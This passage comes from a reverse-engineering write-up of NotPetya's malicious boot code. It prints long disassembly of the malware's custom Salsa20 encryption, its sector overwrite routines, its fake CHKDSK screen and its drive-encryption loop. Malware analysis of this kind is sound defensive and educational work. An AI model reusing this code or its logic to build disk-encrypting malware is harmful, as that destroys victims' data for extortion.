We still miss the "block preparation", the one which prepares us with the block what gets encrypt. Let's check the cross references of `doubleRound`, which gets us to `fcn.00009652`. In here we see, among the logic that is going on, a call to `fcn.000095ec` and `fcn.00009628`.

##### fcn.000095ec
Inside this function we see that there are some logic going on here, and a call to the `CDQ` instruction, which is used to extend the content of a 32 bit register into a 64 bit value, which will get extended in another register. We don't quite know what this function could be used for, So we'll just rename it to `expandFrom32to64`.

This is the dissembly:

```s
0000:95ec      push    bp
0000:95ed      mov     bp, sp
0000:95ef      push    si

0000:95f0      mov     si, word [bp + 4]
0000:95f3      sub     ah, ah
0000:95f5      mov     al, byte [si + 2]

0000:95f8      shl     ax, 0x10
0000:95fb      cdq
0000:95fc      mov     cx, ax

0000:95fe      mov     ah, byte [si + 1]
0000:9601      sub     al, al
0000:9603      mov     bx, dx

0000:9605      cdq
0000:9606      add     ax, cx
0000:9608      adc     dx, bx

0000:960a      mov     cx, ax
0000:960c      mov     ah, byte [si + 3]
0000:960f      shl     ah, 0x10

0000:9612      sub     al, al
0000:9614      mov     bx, dx
0000:9616      cdq

0000:9617      add     ax, cx
0000:9619      adc     dx, bx
0000:961b      mov     cl, byte [si]

0000:961d      sub     ch, ch
0000:961f      add     ax, cx
0000:9621      adc     dx, 0

0000:9624      pop     si
0000:9625      leave
0000:9626      ret
```

##### fcn.00009628
Inside `fcn.0000962` we see that a a call to rightShift is made. Nothing relevant to Salsa20 I think, as all the four shifts have been already done. We'll just call it `performRightShift`. This is the disassembly looks like:

```s
0000:9628      push    bp
0000:9629      mov     bp, sp
0000:962b      push    si

0000:962c      mov     si, word [bp + 4]
0000:962f      mov     al, byte [bp + 6]
0000:9632      mov     byte [si], al

0000:9634      mov     ax, word [bp + 6]
0000:9637      mov     dx, word [bp + 8]
0000:963a      mov     cl, 8

0000:963c      call    rightShift
0000:963f      mov     byte [si + 1], al
0000:9642      mov     al, byte [bp + 8]

0000:9645      mov     byte [si + 2], al
0000:9648      mov     al, byte [bp + 9]
0000:964b      mov     byte [si + 3], al

0000:964e      pop     si
0000:964f      leave
0000:9650      ret
```

##### Back to fcn.00009652
Having a more general overview of the function, we see that it calls `expandFrom32to64`, `doubleRound` and `performRightShift` 16 times each. I don't quite know why as of now. I'll just rename this function `expandAndDoubleRound`. Checking again to the cross references, we see that this function is called from `fcn.000096d4`.

##### fcn.000096d4
Inside `fcn.000096d4` we see that the first instructions are copying some data into the stack. This data is 16 bytes long. This could be the *nothing-up-my-sleeve number*, used to create the chipher block. The standard Salsa20's one however is different: 

```c
"expand 32-byte k"  // Standard Salsa20
"1nvalid s3ct-id\0" // NotPetya custom
```

After looking at the registers content before the call to `expandAndDoubleRound`, nothing interesting comes out nor in the registers, nor in the stack.
But inside `expandAndDoubleRound`, right before the call to `expandFrom32to64`, I see a value in the stack that catches my eyes at `SP + 4`. This value is `0x674a`, which is the address where the 32 byte Salsa20 key is stored.

We'll just assume that this functions prepares the chipher block used to encrypt, so we'll just rename it `prepareChipherBlockAndEncrypt`.

##### Back to fcn.00009798
Following the cross reference of the function, we stumble into `fcn.00009798`, and if you remember, it was one of the functions we left early as it was a mess. Now we know that it handles the encryption routine, so we'll just rename it `encryptionRoutine`. This is what the disassembly looks like:

```s
0000:9798      enter   0x54, 0     ; 'T'
0000:979c      push    di
0000:979d      push    si

0000:979e      xor     ax, ax
0000:97a0      mov     byte [bp - 0x14], al
0000:97a3      mov     cx, 7

0000:97a6      lea     di, [bp - 0x13]
0000:97a9      push    ss
0000:97aa      pop     es

0000:97ab      rep     stosw word es:[di], ax
0000:97ad      stosb   byte es:[di], al
0000:97ae      cmp     word [bp + 4], ax

0000:97b1      je      0x97c1
0000:97b3      mov     si, word [bp + 6]
0000:97b6      or      si, si

0000:97b8      je      0x97c1
0000:97ba      mov     di, word [bp + 0xc]
0000:97bd      or      di, di

0000:97bf      jne     0x97c4
0000:97c1      jmp     0x9871
0000:97c4      mov     word [bp - 2], ax

0000:97c7      mov     word [bp - 4], ax
0000:97ca      cmp     dword [bp - 4], 8
0000:97cf      jae     0x97e3

0000:97d1      mov     bx, word [bp - 4]
0000:97d4      mov     al, byte [bx + si]
0000:97d6      lea     cx, [bp - 0x14]

0000:97d9      add     bx, cx
0000:97db      mov     byte [bx], al
0000:97dd      inc     dword [bp - 4]

0000:97e1      jmp     0x97ca
0000:97e3      mov     si, word [bp + 4]
0000:97e6      test    byte [bp + 8], 0x3f

0000:97ea      je      0x980f
0000:97ec      mov     eax, dword [bp + 8]
0000:97f0      shr     eax, 6

0000:97f4      push    eax
0000:97f6      lea     ax, [bp - 0xc]
0000:97f9      push    ax

0000:97fa      call    performRightShift
0000:97fd      add     sp, 6
0000:9800      lea     ax, [bp - 0x54]

0000:9803      push    ax
0000:9804      lea     ax, [bp - 0x14]
0000:9807      push    ax

0000:9808      push    si
0000:9809      call    prepareChipherBlockAndEncrypt
0000:980c      add     sp, 6

0000:980f      mov     dword [bp - 4], 0
0000:9817      mov     eax, dword [bp + 0xe]
0000:981b      cmp     dword [bp - 4], eax

0000:981f      jae     0x986d
0000:9821      mov     al, byte [bp - 4]
0000:9824      add     al, byte [bp + 8]

0000:9827      test    al, 0x3f
0000:9829      jne     0x9852
0000:982b      mov     eax, dword [bp - 4]

0000:982f      add     eax, dword [bp + 8]
0000:9833      shr     eax, 6
0000:9837      push    eax

0000:9839      lea     ax, [bp - 0xc]
0000:983c      push    ax
0000:983d      call    performRightShift

0000:9840      add     sp, 6
0000:9843      lea     ax, [bp - 0x54]
0000:9846      push    ax

0000:9847      lea     ax, [bp - 0x14]
0000:984a      push    ax
0000:984b      push    si

0000:984c      call    prepareChipherBlockAndEncrypt
0000:984f      add     sp, 6
0000:9852      mov     bx, word [bp - 4]

0000:9855      add     bl, byte [bp + 8]
0000:9858      and     bx, 0x3f
0000:985b      lea     ax, [bp - 0x54]

0000:985e      add     bx, ax
0000:9860      mov     al, byte [bx]
0000:9862      mov     bx, word [bp - 4]

0000:9865      xor     byte [bx + di], al
0000:9867      inc     dword [bp - 4]
0000:986b      jmp     0x9817

0000:986d      xor     ax, ax
0000:986f      jmp     0x9874
0000:9871      mov     ax, 1

0000:9874      pop     si
0000:9875      pop     di
0000:9876      leave

0000:9877      ret
```

##### Back to address 0x0000:0x84e8
Now that we're finally back to the main function the MBR calls, we can also figure out some of the parameters that are pushed before the call to `encryptionRoutine`. We see, in the following order, the following values being pushed into the stack: `0x0`, `0x200`, `0x676a` (Address of sector `33`), `0x0`, `0x0`, `0x778b` (Address of the nonce), `0x674a` (Address of the encryption key).

We can assume that this function encrypts `0x200` bytes from address `0x676a`, with key at address `0x674a` and nonce at address `0x778b`.

After the encryption routine is called, we see a call to `storeSectorIntoMemory`. However, we see that the first number pushed into the stack is `0x1`, so it's writing to disk, not reading. In particular, it's writing the encrypted buffer back to sector `33`.

After that, we see a string pushed into the stack, alongside some other variables. We recognize the address of the nonce, the address of the encryption key and another address which points to value `0x80`. May it be the drive id? However, we see that after the 8 bytes of the nonce, there is the Bitcoin address used by the malware. Anyways, time to check out `fcn.00008c98`.

##### fcn.00008c98
There is a ton of logic going on here. A thing that catches my eyes is is small loop that zeroes out `0x200` bytes from address `0x650c`. Also, we can see that one of the two calls to `storeSectorIntoMemory` zeroes out sector `35`, as `512` bytes from address `0x650c` are all zeroes.

We also see that after that call, addresses `0x670c` and `0x6780` get pushed into the stack, followed by a call to `fcn.00009386`. Not quite sure what's inside of those addresses, but we might figure that out later. It seems like just like the encryption routine, we have no better choice than to go investigate in each function and try to make sense of the code.

##### fcn.00009386
Inside `fcn.00009386` we see that a call to `storeSectorIntoMemory` is made. The parameters indicate that it's reading sector `34`, and storing it into address `0x60fa`. We know that inside sector `34` there is our original MBR xored with `0x7`. After that we see some logic going on, which is not very clear. We can break at the end of `fcn.00009386` to check if sector `34` is manipulated is some other ways. It turns out that this function is xoring back with `0x7` our original MBR.

We'll rename this function `XORwith7`.

##### Back to fcn.00008c98
Following the function flow with Bochs, we see that it stores sector number `0x8000`, and saves it's content into address `0x630c`.
After that, we see that a call to `fcn.00008de2` is made.

##### fcn.00008de2
Inside , we see that among all the logic `fcn.00008fa6` is called.

##### fcn.00008fa6
When we step into `fcn.00008fa6` we immediately see that some sectors are read, a call to `fcn.00008684` is made, and multiple calls to `encryptionRoutine` and `storeSectorIntoMemory` are made. At the end of the function we see that sector `35` is written back into the drive. It's not as easy as it seems to decipher this code.

##### fcn.00008684
Inside `fcn.00008684` we see some calls to `printPushedString` alongside with 3 calls to `fcn.000085fc`. We see that one of the string being pushed into the custom print function is `" of "`. This reminds me of the "sector counter" of the fake CHKDSK screen. Following the string address we see some other iteresting strings:

```s
0000:9fdf          .string " of "               ; len=5
0000:9fe4          .string "%)            "     ; len=15

0000:9ff3      and     byte [bx + si], ah
0000:9ff5      add     byte [bx + si], ah

0000:9ff7          .string "    "               ; len=5

0000:9ffb      sub     ax, 0xd00

0000:9ffd          .string "\r\n    "           ; len=7
```

Those are all strings related to the fake CHKDSK screen.

##### fcn.000085fc, fcn.000080a2
That also help us figuring out what `fcn.000085fc` does. In fact, we can see that there is some logic going on inside it. We can assume that those function displays the number of sectors, the sectors encrypted, and the percentage.

We'll rename `fcn.000085fc` into `printNumberLogic`. We can also rename `fcn.000080a2` to `printNumberLogicInternal`, just to be consistent.

##### Back to fcn.00008684
This is the final resoult of `fcn.00008684`:

```s
0000:8684      push    bp
0000:8685      mov     bp, sp
0000:8687      push    0x9fdb

0000:868a      call    printPushedString
0000:868d      pop     bx
0000:868e      push    word [bp + 4]

0000:8691      call    printPushedString
0000:8694      pop     bx
0000:8695      push    0x9fdd

0000:8698      call    printPushedString
0000:869b      pop     bx
0000:869c      push    dword [bp + 6]

0000:86a0      call    printNumberLogic
0000:86a3      mov     sp, bp
0000:86a5      push    str.of                   ; 0x9fdf

0000:86a8      call    printPushedString
0000:86ab      pop     bx
0000:86ac      push    dword [bp + 0xa]

0000:86b0      call    printNumberLogic
0000:86b3      mov     sp, bp
0000:86b5      push    0x9fe4

0000:86b8      call    printPushedString
0000:86bb      pop     bx
0000:86bc      mov     eax, dword [bp + 6]

0000:86c0      mov     ecx, 0x64                ; 'd'
0000:86c6      mul     ecx
0000:86c9      xor     edx, edx

0000:86cc      div     dword [bp + 0xa]
0000:86d0      push    eax
0000:86d2      call    printNumberLogic

0000:86d5      mov     sp, bp
0000:86d7      push    0x9fe7
0000:86da      call    printPushedString

0000:86dd      pop     bx
0000:86de      leave
0000:86df      ret
```

We'll rename it `printCHKDSKprogress`.

This is what the `fake CHKDSK screen` looks like:

![Fake CHKDSK](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/FakeCHKDSK.png)

##### Back to fcn.00008fa6
Now we have a more clear overwiew of what `fcn.00008fa6`. This is the main payload, which encrypts the sectors on the disk. We'll rename the function `encryptDrive`.
The disassembly for this function is massive too:

```s
0000:8fa6      enter   0xa42, 0
0000:0faa      push    di
0000:8fab      push    si

0000:8fac      push    0
0000:8fae      push    1
0000:8fb0      push    0

0000:8fb2      push    0x23
0000:8fb4      lea     ax, [bp - 0x230]
0000:8fb8      mov     word [bp - 2], ax

0000:8fbb      push    ax
0000:8fbc      mov     al, byte [bp + 4]
0000:8fbf      push    ax

0000:8fc0      call    storeSectorIntoMemory
0000:8fc3      add     sp, 0xc
0000:8fc6      cmp     byte [bp + 0x20], 0

0000:8fca      jne     0x8fd6
0000:8fcc      cmp     dword [bp - 0x230], 0
0000:8fd2      je      0x9381

0000:8fd6      mov     dword [bp - 0x24], 0
0000:8fde      mov     di, word [bp + 0x1c]
0000:8fe1      mov     eax, dword [bp + 0xa]

0000:8fe5      mov     dx, word [bp + 0xc]
0000:8fe8      cmp     dword [bp - 0x24], eax
0000:8fec      jae     0x9381

0000:8ff0      test    byte [bp - 0x24], 0x3f
0000:8ff4      jne     0x9005
0000:8ff6      push    dx

0000:8ff7      push    ax
0000:8ff8      push    dword [bp - 0x24]
0000:8ffc      push    word [bp + 0x1e]

0000:8fff      call    printCHKDSKprogress
0000:9002      add     sp, 0xa
0000:9005      push    0

0000:9007      push    2
0000:9009      mov     eax, dword [bp - 0x24]
0000:900d      add     eax, dword [bp + 6]
0000:9011      push    eax

0000:9013      lea     ax, [bp - 0x630]
0000:9017      push    ax
0000:9018      mov     al, byte [bp + 4]

0000:901b      push    ax
0000:901c      call    storeSectorIntoMemory
0000:901f      add     sp, 0xc

0000:9022      mov     si, word [bp + 0x18]
0000:9025      cmp     byte [bp + 0x20], 0
0000:9029      jne     0x907c

0000:902b      push    0
0000:902d      push    0x400
0000:9030      lea     ax, [bp - 0x630]

0000:9034      push    ax
0000:9035      mov     cx, word [bp - 0x24]
0000:9038      mov     dx, word [bp - 0x22]

0000:903b      add     cx, word [bp + 6]
0000:903e      adc     dx, word [bp + 8]
0000:9041      push    dx

0000:9042      push    cx
0000:9043      push    di
0000:9044      push    word [bp + 0x1a]

0000:9047      mov     word [bp - 0xa34], cx
0000:904b      mov     word [bp - 0xa32], dx
0000:904f      call    encryptionRoutine

0000:9052      add     sp, 0xe
0000:9055      push    1
0000:9057      push    2
0000:9059      push    dword [bp - 0xa34]

0000:905e      lea     ax, [bp - 0x630]
0000:9062      push    ax
0000:9063      mov     al, byte [bp + 4]

0000:9066      push    ax
0000:9067      call    storeSectorIntoMemory
0000:906a      add     sp, 0xc

0000:906d      inc     dword [si]
0000:9070      mov     eax, dword [si]
0000:9073      cmp     dword [bp - 0x230], eax

0000:9078      jb      0x9381
0000:907c      cmp     byte [bp - 0x630], 0x46
0000:9081      jne     0x9119

0000:9085      cmp     byte [bp - 0x62f], 0x49
0000:908a      jne     0x9119
0000:908e      cmp     byte [bp - 0x62e], 0x4c

0000:9093      jne     0x9119
0000:9097      cmp     byte [bp - 0x62d], 0x45
0000:909c      jne     0x9119

0000:909e      mov     ax, word [bp - 0x61c]
0000:90a2      mov     word [bp - 0x18], ax
0000:90a5      mov     word [bp - 0x16], 0

0000:90aa      mov     eax, dword [bp - 0x618]
0000:90af      mov     dword [bp - 0x28], eax
0000:90b3      mov     dword [bp - 0x1c], 0

0000:90bb      cmp     dword [bp - 0x1c], 0xffffffff
0000:90c0      je      0x9119
0000:90c2      cmp     dword [bp - 0x18], 0x400

0000:90ca      jae     0x9119
0000:90cc      mov     bx, word [bp - 0x18]
0000:90cf      lea     ax, [bp - 0x630]

0000:90d3      add     bx, ax
0000:90d5      mov     eax, dword [bx]
0000:90d8      mov     dword [bp - 0x1c], eax

0000:90dc      mov     bx, word [bp - 0x18]
0000:90df      lea     cx, [bp - 0x62c]
0000:90e3      add     bx, cx

0000:90e5      mov     dword [bp - 0xa38], eax
0000:90ea      mov     eax, dword [bx]
0000:90ed      mov     dword [bp - 0x20], eax

0000:90f1      cmp     dword [bp - 0xa38], 0x30
0000:90f7      jne     0x918e
0000:90fb      mov     bx, word [bp - 0x18]

0000:90fe      lea     ax, [bp - 0x5d8]
0000:9102      add     bx, ax
0000:9104      cmp     byte [bx], 1

0000:9107      je      0x9119
0000:9109      mov     bx, word [bp - 0x18]
0000:910c      lea     ax, [bp - 0x5d6]

0000:9110      add     bx, ax
0000:9112      cmp     byte [bx], 0x24
0000:9115      jne     0x9376

0000:9119      cmp     byte [bp + 0x20], 1
0000:911d      jne     0x9186
0000:911f      push    0

0000:9121      push    0x400
0000:9124      lea     ax, [bp - 0x630]
0000:9128      push    ax

0000:9129      mov     cx, word [bp - 0x24]
0000:912c      mov     dx, word [bp - 0x22]
0000:912f      add     cx, word [bp + 6]

0000:9132      adc     dx, word [bp + 8]
0000:9135      push    dx
0000:9136      push    cx

0000:9137      push    di
0000:9138      push    word [bp + 0x1a]
0000:913b      mov     word [bp - 0xa42], cx

0000:913f      mov     word [bp - 0xa40], dx
0000:9143      call    encryptionRoutine
0000:9146      add     sp, 0xe

0000:9149      push    1
0000:914b      push    2
0000:914d      push    dword [bp - 0xa42]

0000:9152      lea     ax, [bp - 0x630]
0000:9156      push    ax
0000:9157      mov     al, byte [bp + 4]

0000:915a      push    ax
0000:915b      call    storeSectorIntoMemory
0000:915e      mov     bx, word [bp + 0x18]

0000:9161      add     sp, 0xc
0000:9164      inc     dword [bx]
0000:9167      mov     eax, dword [bx]

0000:916a      mov     dword [bp - 0x230], eax
0000:916f      push    1
0000:9171      push    1

0000:9173      push    0
0000:9175      push    0x23
0000:9177      lea     ax, [bp - 0x230]

0000:917b      push    ax
0000:917c      mov     al, byte [bp + 4]
0000:917f      push    ax

0000:9180      call    storeSectorIntoMemory
0000:9183      add     sp, 0xc
0000:9186      add     dword [bp - 0x24], 2

0000:918b      jmp     0x8fe1
0000:918e      cmp     dword [bp - 0x1c], 0x80
0000:9196      jne     0x9376

0000:919a      mov     bx, word [bp - 0x18]
0000:919d      lea     ax, [bp - 0x628]
0000:91a1      add     bx, ax

0000:91a3      cmp     byte [bx], 1
0000:91a6      jne     0x920b
0000:91a8      mov     eax, dword [bp - 0x18]

0000:91ac      add     eax, dword [bp - 0x20]
0000:91b0      sub     eax, 4
0000:91b6      mov     dword [bp - 0x14], eax

0000:91ba      mov     cx, word [bp - 0x18]
0000:91bd      mov     bx, cx
0000:91bf      lea     cx, [bp - 0x610]

0000:91c3      add     bx, cx
0000:91c5      mov     cx, word [bp - 0x18]
0000:91c8      mov     ax, word [bp - 0x16]

0000:91cb      add     cx, word [bx]
0000:91cd      adc     ax, 0
0000:91d0      mov     word [bp - 6], cx

0000:91d3      mov     word [bp - 4], ax
0000:91d6      mov     eax, dword [bp - 0x28]
0000:91da      cmp     dword [bp - 0x14], eax

0000:91de      ja      0x920b
0000:91e0      mov     eax, dword [bp - 0x14]
0000:91e4      cmp     dword [bp - 6], eax

0000:91e8      jae     0x920b
0000:91ea      mov     bx, word [bp - 6]
0000:91ed      lea     ax, [bp - 0x630]

0000:91f1      add     bx, ax
0000:91f3      mov     al, byte [bx]
0000:91f5      mov     cx, ax

0000:91f7      and     al, 0xf
0000:91f9      mov     byte [bp - 2], al
0000:91fc      shr     cl, 4

0000:91ff      mov     byte [bp - 0xb], cl
0000:9202      cmp     al, 4
0000:9204      ja      0x920b

0000:9206      cmp     cl, 4
0000:9209      jbe     0x920e
0000:920b      jmp     0x9376

0000:920e      mov     byte [bp - 1], 0
0000:9212      mov     bl, byte [bp - 1]
0000:9215      sub     bh, bh

0000:9217      lea     ax, [bp - 0x30]
0000:921a      mov     cx, bx
0000:921c      add     bx, ax

0000:921e      xor     al, al
0000:9220      mov     byte [bx], al
0000:9222      lea     bx, [bp - 0x2c]

0000:9225      add     bx, cx
0000:9227      mov     byte [bx], al
0000:9229      inc     byte [bp - 1]

0000:922c      cmp     byte [bp - 1], 4
0000:9230      jb      0x9212
0000:9232      mov     byte [bp - 1], al

0000:9235      jmp     0x9255
0000:9237      mov     bl, byte [bp - 1]
0000:923a      sub     bh, bh

0000:923c      mov     ax, bx
0000:923e      add     bx, word [bp - 6]
0000:9241      lea     cx, [bp - 0x62f]

0000:9245      add     bx, cx
0000:9247      mov     cl, byte [bx]
0000:9249      lea     dx, [bp - 0x30]

0000:924c      mov     bx, ax
0000:924e      add     bx, dx
0000:9250      mov     byte [bx], cl

0000:9252      inc     byte [bp - 1]
0000:9255      mov     al, byte [bp - 1]
0000:9258      cmp     byte [bp - 2], al

0000:925b      ja      0x9237
0000:925d      mov     byte [bp - 1], 0
0000:9261      jmp     0x9286

0000:9263      mov     bl, byte [bp - 2]
0000:9266      sub     bh, bh
0000:9268      mov     al, byte [bp - 1]

0000:926b      sub     ah, ah
0000:926d      add     bx, ax
0000:926f      add     bx, word [bp - 6]

0000:9272      lea     cx, [bp - 0x62f]
0000:9276      add     bx, cx
0000:9278      mov     cl, byte [bx]

0000:927a      mov     bx, ax
0000:927c      lea     dx, [bp - 0x2c]
0000:927f      add     bx, dx

0000:9281      mov     byte [bx], cl
0000:9283      inc     byte [bp - 1]
0000:9286      mov     al, byte [bp - 1]

0000:9289      cmp     byte [bp - 0xb], al
0000:928c      ja      0x9263
0000:928e      push    dword [bp - 0x30]

0000:9292      mov     al, byte [bp + 0x16]
0000:9295      sub     ah, ah
0000:9297      sub     dx, dx

0000:9299      push    dx
0000:929a      push    ax
0000:929b      mov     word [bp - 0xa3c], ax

0000:929f      mov     word [bp - 0xa3a], dx
0000:92a3      pop     eax
0000:92a5      pop     ecx

0000:92a7      mul     ecx
0000:92aa      mov     dword [bp - 0x10], eax
0000:92ae      mov     eax, dword [bp - 0xa3c]

0000:92b3      mul     dword [bp - 0x2c]
0000:92b7      add     eax, dword [bp + 0xe]
0000:92bb      mov     dword [bp - 0xa], eax

0000:92bf      cmp     dword [bp - 0x10], 0
0000:92c4      je      0x935f
0000:92c8      cmp     dword [bp - 0x10], 2

0000:92cd      jbe     0x92d7
0000:92cf      mov     dword [bp - 0x10], 2
0000:92d7      mov     eax, dword [bp + 0xe]

0000:92db      mov     dx, word [bp + 0x10]
0000:92de      cmp     dword [bp - 0xa], eax
0000:92e2      jbe     0x935f

0000:92e4      push    0
0000:92e6      mov     ax, word [bp - 0x10]
0000:92e9      push    ax

0000:92ea      push    dword [bp - 0xa]
0000:92ee      lea     cx, [bp - 0xa30]
0000:92f2      push    cx

0000:92f3      mov     dl, byte [bp + 4]
0000:92f6      push    dx
0000:92f7      mov     word [bp - 0xa3e], ax

0000:92fb      call    storeSectorIntoMemory
0000:92fe      add     sp, 0xc
0000:9301      mov     eax, dword [bp - 0x10]

0000:9305      shl     eax, 9
0000:9309      push    eax
0000:930b      lea     ax, [bp - 0xa30]

0000:930f      push    ax
0000:9310      push    dword [bp - 0xa]
0000:9314      push    di

0000:9315      push    word [bp + 0x1a]
0000:9318      call    encryptionRoutine
0000:931b      add     sp, 0xe

0000:931e      push    1
0000:9320      push    word [bp - 0xa3e]
0000:9324      push    dword [bp - 0xa]

0000:9328      lea     ax, [bp - 0xa30]
0000:932c      push    ax
0000:932d      mov     al, byte [bp + 4]

0000:9330      push    ax
0000:9331      call    storeSectorIntoMemory
0000:9334      add     sp, 0xc

0000:9337      inc     dword [si]
0000:933a      cmp     byte [bp + 0x20], 1
0000:933e      jne     0x935f

0000:9340      mov     eax, dword [si]
0000:9343      mov     dword [bp - 0x230], eax
0000:9348      push    1

0000:934a      push    1
0000:934c      push    0
0000:934e      push    0x23

0000:9350      lea     ax, [bp - 0x230]
0000:9354      push    ax
0000:9355      mov     al, byte [bp + 4]

0000:9358      push    ax
0000:9359      call    storeSectorIntoMemory
0000:935c      add     sp, 0xc

0000:935f      mov     al, byte [bp - 0xb]
0000:9362      sub     ah, ah
0000:9364      mov     cl, byte [bp - 2]

0000:9367      sub     ch, ch
0000:9369      add     ax, cx
0000:936b      inc     ax

0000:936c      cdq
0000:936d      add     word [bp - 6], ax
0000:9370      adc     word [bp - 4], dx

0000:9373      jmp     0x91e0
0000:9376      mov     eax, dword [bp - 0x20]
0000:937a      add     dword [bp - 0x18], eax

0000:937e      jmp     0x90bb
0000:9381      pop     si
0000:9382      pop     di

0000:9383      leave
0000:9384      ret
```

##### Back to fcn.00008de2
Now we can finally see that `fcn.00008de2` is actually the drive encryption payload so we'll just rename it `driveEncryptionPayload`.
This is the disassembly:

```s
0000:8de2      enter   0x420, 0
0000:8de6      push    di
0000:8de7      push    si

0000:8de8      push    0
0000:8dea      push    2
0000:8dec      push    dword [bp + 0xc]

0000:8df0      lea     ax, [bp - 0x41c]
0000:8df4      push    ax
0000:8df5      mov     al, byte [bp + 4]

0000:8df8      push    ax
0000:8df9      call    storeSectorIntoMemory
0000:8dfc      add     sp, 0xc

0000:8dff      mov     dword [bp - 6], 0x38
0000:8e07      mov     ax, word [bp - 0x3e4]
0000:8e0b      mov     dx, word [bp - 0x3e2]

0000:8e0f      mov     word [bp - 0xa], ax
0000:8e12      mov     word [bp - 8], dx
0000:8e15      mov     ax, dx

0000:8e17      or      ax, word [bp - 0xa]
0000:8e1a      je      0x8e4d
0000:8e1c      cmp     word [bp - 0xa], 0x80

0000:8e21      jne     0x8e27
0000:8e23      or      dx, dx
0000:8e25      je      0x8e4d

0000:8e27      cmp     word [bp - 0xa], 0xffff
0000:8e2b      jne     0x8e32
0000:8e2d      cmp     dx, 0xffff

0000:8e30      je      0x8e4d
0000:8e32      mov     si, word [bp - 6]
0000:8e35      mov     eax, dword [bp + si - 0x418]

0000:8e3a      add     dword [bp - 6], eax
0000:8e3e      mov     ax, word [bp - 6]
0000:8e41      mov     si, ax

0000:8e43      mov     ax, word [bp + si - 0x41c]
0000:8e47      mov     dx, word [bp + si - 0x41a]
0000:8e4b      jmp     0x8e0f

0000:8e4d      mov     si, word [bp - 6]
0000:8e50      mov     ax, word [bp + si - 0x418]
0000:8e54      mov     dx, word [bp + si - 0x416]

0000:8e58      add     ax, si
0000:8e5a      adc     dx, word [bp - 4]
0000:8e5d      sub     ax, 4

0000:8e60      sbb     dx, 0
0000:8e63      mov     word [bp - 0x14], ax
0000:8e66      mov     word [bp - 0x12], dx

0000:8e69      add     dword [bp - 6], 0x40
0000:8e6e      mov     di, word [bp + 0x12]
0000:8e71      mov     si, word [bp + 0x14]

0000:8e74      mov     eax, dword [bp - 0x14]
0000:8e78      cmp     dword [bp - 6], eax
0000:8e7c      jae     0x8fa1

0000:8e80      mov     bx, word [bp - 6]
0000:8e83      lea     ax, [bp - 0x41c]
0000:8e87      add     bx, ax

0000:8e89      mov     al, byte [bx]
0000:8e8b      mov     cx, ax
0000:8e8d      and     al, 0xf

0000:8e8f      mov     byte [bp - 2], al
0000:8e92      shr     cl, 4
0000:8e95      mov     byte [bp - 0xb], cl

0000:8e98      mov     byte [bp - 1], 0
0000:8e9c      mov     bl, byte [bp - 1]
0000:8e9f      sub     bh, bh

0000:8ea1      lea     ax, [bp - 0x1c]
0000:8ea4      mov     cx, bx
0000:8ea6      add     bx, ax

0000:8ea8      xor     al, al
0000:8eaa      mov     byte [bx], al
0000:8eac      lea     bx, [bp - 0x18]

0000:8eaf      add     bx, cx
0000:8eb1      mov     byte [bx], al
0000:8eb3      inc     byte [bp - 1]

0000:8eb6      cmp     byte [bp - 1], 4
0000:8eba      jb      0x8e9c
0000:8ebc      mov     byte [bp - 1], al

0000:8ebf      jmp     0x8edf
0000:8ec1      mov     bl, byte [bp - 1]
0000:8ec4      sub     bh, bh

0000:8ec6      mov     ax, bx
0000:8ec8      add     bx, word [bp - 6]
0000:8ecb      lea     cx, [bp - 0x41b]

0000:8ecf      add     bx, cx
0000:8ed1      mov     cl, byte [bx]
0000:8ed3      lea     dx, [bp - 0x1c]

0000:8ed6      mov     bx, ax
0000:8ed8      add     bx, dx
0000:8eda      mov     byte [bx], cl

0000:8edc      inc     byte [bp - 1]
0000:8edf      mov     al, byte [bp - 1]
0000:8ee2      cmp     byte [bp - 2], al

0000:8ee5      ja      0x8ec1
0000:8ee7      mov     byte [bp - 1], 0
0000:8eeb      jmp     0x8f10

0000:8eed      mov     bl, byte [bp - 2]
0000:8ef0      sub     bh, bh
0000:8ef2      mov     al, byte [bp - 1]

0000:8ef5      sub     ah, ah
0000:8ef7      add     bx, ax
0000:8ef9      add     bx, word [bp - 6]

0000:8efc      lea     cx, [bp - 0x41b]
0000:8f00      add     bx, cx
0000:8f02      mov     cl, byte [bx]

0000:8f04      mov     bx, ax
0000:8f06      lea     dx, [bp - 0x18]
0000:8f09      add     bx, dx

0000:8f0b      mov     byte [bx], cl
0000:8f0d      inc     byte [bp - 1]
0000:8f10      mov     al, byte [bp - 1]

0000:8f13      cmp     byte [bp - 0xb], al
0000:8f16      ja      0x8eed
0000:8f18      push    dword [bp - 0x18]

0000:8f1c      mov     al, byte [bp + 0xa]
0000:8f1f      sub     ah, ah
0000:8f21      sub     dx, dx

0000:8f23      push    dx
0000:8f24      push    ax
0000:8f25      mov     word [bp - 0x420], ax

0000:8f29      mov     word [bp - 0x41e], dx
0000:8f2d      pop     eax
0000:8f2f      pop     ecx

0000:8f31      mul     ecx
0000:8f34      add     eax, dword [bp + 6]
0000:8f38      add     eax, 0x20

0000:8f3e      mov     dword [bp - 0x10], eax
0000:8f42      mov     eax, dword [bp - 0x420]
0000:8f47      mul     dword [bp - 0x1c]

0000:8f4b      sub     eax, 0x20
0000:8f51      mov     dword [bp - 0xa], eax
0000:8f55      mov     dx, word [bp - 8]

0000:8f58      cmp     eax, 0
0000:8f5e      je      0x8f8a
0000:8f60      mov     al, byte [bp + 0x18]

0000:8f63      push    ax
0000:8f64      push    word [bp + 0x16]
0000:8f67      push    si

0000:8f68      push    di
0000:8f69      push    word [bp + 0x10]
0000:8f6c      mov     al, byte [bp + 0xa]

0000:8f6f      push    ax
0000:8f70      push    dword [bp + 0xc]
0000:8f74      push    dword [bp + 6]

0000:8f78      push    dx
0000:8f79      push    word [bp - 0xa]
0000:8f7c      push    dword [bp - 0x10]

0000:8f80      mov     al, byte [bp + 4]
0000:8f83      push    ax
0000:8f84      call    encryptDrive

0000:8f87      add     sp, 0x1e
0000:8f8a      mov     al, byte [bp - 0xb]
0000:8f8d      sub     ah, ah

0000:8f8f      mov     cl, byte [bp - 2]
0000:8f92      sub     ch, ch
0000:8f94      add     ax, cx

0000:8f96      inc     ax
0000:8f97      cdq
0000:8f98      add     word [bp - 6], ax

0000:8f9b      adc     word [bp - 4], dx
0000:8f9e      jmp     0x8e74
0000:8fa1      pop     si

0000:8fa2      pop     di
0000:8fa3      leave
0000:8fa4      ret
```

##### Back to fcn.00008c98
Now we can imagine what this function does. The seemingly random decryption of the orignal MBR may be used to retrieve some information about the drive (maybe about the MFT, but I'm not sure). Then the disk encryption begins. We'll rename this function `P`. This is what the disassembly looks like:

```s
0000:8c98      enter   0x42e, 0
0000:8c9c      push    di
0000:8c9d      push    si

